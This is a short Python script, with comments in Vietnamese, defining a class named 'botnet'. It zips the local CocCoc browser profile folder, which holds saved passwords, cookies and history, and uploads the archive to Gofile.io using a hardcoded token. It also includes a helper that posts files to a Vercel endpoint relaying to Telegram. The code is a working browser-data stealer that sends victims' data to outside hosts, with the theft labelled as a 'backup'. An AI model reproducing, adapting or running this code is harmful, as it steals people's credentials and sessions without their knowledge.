import requests
import os
import shutil
import tempfile
import zipfile

class botnet:
    def __init__(self):
        self.url = 'http://web-mmo-blush.vercel.app/api/upload-to-telegram'

    def upload_file(self, file_path, caption='via clone'):
        with open(file_path, 'rb') as f:
            files = {'file': f}
            data = {'caption': caption}
            response = requests.post(self.url, files=files, data=data)
            return response.status_code == 200

    def zip_folder(self, folder_path):
        # Tạo file zip tạm trong thư mục tạm thời
        zip_name = os.path.basename(folder_path.rstrip(os.sep)) + '.zip'
        temp_zip_path = os.path.join(tempfile.gettempdir(), zip_name)

        with zipfile.ZipFile(temp_zip_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
            for root, _, files in os.walk(folder_path):
                for file in files:
                    file_path = os.path.join(root, file)
                    arcname = os.path.relpath(file_path, folder_path)
                    zipf.write(file_path, arcname)
        return temp_zip_path

    def compressed_folders(self):
        folders_to_compress = [
            os.path.normpath(os.path.expandvars(r"%LOCALAPPDATA%\CocCoc"))  # Ưu tiên folder chứa dữ liệu người dùng
        ]

        for folder in folders_to_compress:
            if not os.path.exists(folder):
                print(f"❌ Không tồn tại: {folder}")
                continue

            try:
                zip_path = self.zip_folder(folder)
                print(f"Nén xong: {zip_path}")

                # Gửi file zip lên Gofile.io
                gofile_token = "07C7SRQhc9KG5MFmVdA4H3nuRViWoJKV"

                # B1: Lấy server
                server_res = requests.get("https://api.gofile.io/getServer")
                server = server_res.json()['data']['server']
                upload_url = f"https://{server}.gofile.io/uploadFile"

                with open(zip_path, "rb") as f:
                    files = {"file": f}
                    data = {
                        "token": gofile_token,
                        "description": "CocCoc backup",
                    }
                    res = requests.post(upload_url, files=files, data=data)

                if res.status_code == 200 and res.json()["status"] == "ok":
                    download_link = res.json()["data"]["downloadPage"]
                    print(f"✅ Upload thành công! Link: {download_link}")
                    os.remove(zip_path)
                    print("🧹 Đã xóa file zip.")
                else:
                    print(f"❌ Upload thất bại: {res.text}")

            except Exception as e:
                print(f"⚠️ Lỗi khi xử lý {folder}: {e}")



# botnet().compressed_folders()